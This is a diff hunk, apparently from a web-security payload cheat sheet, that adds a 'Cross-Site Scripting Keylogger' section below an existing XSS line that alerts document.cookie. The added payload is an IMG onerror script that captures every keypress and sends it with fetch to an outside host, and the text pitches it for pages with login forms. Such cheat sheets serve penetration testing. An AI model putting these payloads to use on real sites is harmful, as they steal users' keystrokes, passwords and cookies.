@@ -1655,6 +1655,14 @@ R
 R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 ```
 
+#### Cross-Site Scripting Keylogger
+
+```
+Easy JavaScript Keylogger with IMG Tags. Useful for XSS with Login Forms present.
+
+<img src=x onerror='document.onkeypress=function(e){fetch("http://bugcrowd.com/?k="+String.fromCharCode(e.which))},this.remove();'>
+```
+
 
 #### XMLRPC.php
 
